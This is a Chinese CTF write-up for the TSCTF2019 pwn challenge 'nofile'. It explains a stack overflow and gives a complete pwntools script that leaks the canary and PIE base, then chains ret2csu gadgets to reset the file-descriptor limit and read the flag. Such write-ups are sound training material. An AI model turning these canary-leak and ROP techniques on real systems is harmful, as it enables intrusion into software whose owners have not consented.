---
title: nofile
categories:
- TSCTF2019
---
# tsctf2019 -> nofile

## 程序逻辑

程序中main函数里首先执行Init，Init()使用setrlimit()限制了文件的描述符，导致无法打开文件分配文件描述符。程序提供了vulnfunc读取flag。

在main函数里，可以读取5个字节整数长度的数据，这里有栈溢出。之后可以重新构造数据，二次溢出

![main](./1.jpg)

![init](./2.jpg)

![vulnfunc](./3.jpg)

## 漏洞利用

程序开了地址随机化和canary，要先泄露程序加载基地址和canary。观察一下发现rbp-8(canary)后面可泄露程序加载基址，可以构造'a'*0x18+'\n'，还原canary并得到程序加载基址。

之后拿csu的gadgets依次执行getrlimit(RLIMIT_NOFILE,bss_addr),read(0,bss_addr,100)输入构造的假的rlimit结构体，其rlimits.rlim_cur为1024。

read(0,bss_addr+0x30,100)读取"flag",setrlimit(RLIMIT_NOFILE, bss_addr)设置fd软限制为1024

最后用pop_rdi_ret把bss+0x30作为参数传给vuln，调用这个函数即可读取flag

![stack](./4.jpg)


## exp.py

```py
#coding=utf-8
from pwn import *
debug = 0
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
p = process('./nofile')
elf = ELF('./nofile')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:
    p = process('./nofile')
    gdb.attach(p,'b *0x555555554dda')
else:
    p = remote('10.112.100.47',6135)

def csu(base,rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = ""
    csu_end_addr = base + 0xdda
    csu_front_addr = base + 0xdc0
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    return payload
    #sleep(1)

def exp():
    '''
    canary = 0x555555554d00
    payload = 'b'*0x20 + p64(canary) + 'a'*8 + '\x13\x0c'
    p.recvuntil('How long is your Name? 2,3or4?\n')
    p.sendline(str(payload))
    '''
    #leak canary
    
    pop_rdi_ret = 0xde3
    p.recvuntil('How long is your Name? 2,3or4?\n')
    p.sendline('24')
    p.recvline()
    p.sendline('a'*24)
    p.recvline()
    canary = u64(('\x00'+p.recv(7)).ljust(8,'\x00'))
    log.success('canary => ' + hex(canary))
    main_base = u64(p.recv(6).ljust(8,'\x00')) - 0xd80
    log.success('main base => ' + hex(main_base))
    #overwrite
    p.recvline()
    p.send('n')
    #rop = ROP('./nofile')
    #print rop.setrlimit(7,p64(1024))
    pop_rdi_ret += main_base
    print 'pop rdi ret ' + hex(pop_rdi_ret)
    vuln = main_base + 0xc13
    call_setrlimit = main_base + 0xb3e
    bss_addr = elf.bss() + main_base + 0x30
    read_got = elf.got['read'] + main_base
    setrlimit_got = elf.got['setrlimit'] + main_base
    getrlimit_got = elf.got['getrlimit'] + main_base
    ret_addr = 0x8f1 + main_base
    rops = csu(main_base,0,1,getrlimit_got,0,bss_addr,7,ret_addr)

    payload = 'b'*0x18 + p64(canary) + 'a'*8 + rops
    rops = csu(main_base,0,1,read_got,100,bss_addr,0,ret_addr)
    payload += rops
    rops = csu(main_base,0,1,read_got,100,bss_addr+0x30,0,ret_addr)
    payload += rops
    payload += csu(main_base,0,1,setrlimit_got,0,bss_addr,7,pop_rdi_ret)
    payload += p64(bss_addr+0x30) + p64(vuln)
    p.recvline()
    p.sendline(str(len(payload)))
    p.recvline()
    #p.sendline(str(len(payload)))
    p.sendline(payload)
    raw_input()
    fake_struct = p64(1024)
    p.send(fake_struct)
    raw_input()
    p.send('flag\x00\x00\x00\x00')
    
    p.interactive()
exp()

```
